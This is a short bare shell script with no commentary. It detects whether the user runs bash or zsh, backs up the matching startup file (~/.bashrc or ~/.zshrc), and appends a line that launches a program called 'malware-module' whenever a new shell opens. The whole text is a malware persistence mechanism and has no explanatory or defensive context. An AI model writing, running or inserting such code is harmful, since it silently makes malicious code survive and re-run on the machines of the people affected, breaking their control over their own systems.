if [[ "$SHELL" == "/bin/bash" ]]
then 
  cp ~/.bashrc ~/.bashrc.bak
  echo ./malware-module >> ~/.bashrc
fi

if [[ "$SHELL" == "/bin/zsh" ]]
then
  cp ~/.zshrc ~/.zshrc.bak
  echo ./malware-module >> ~/.zshrc
fi

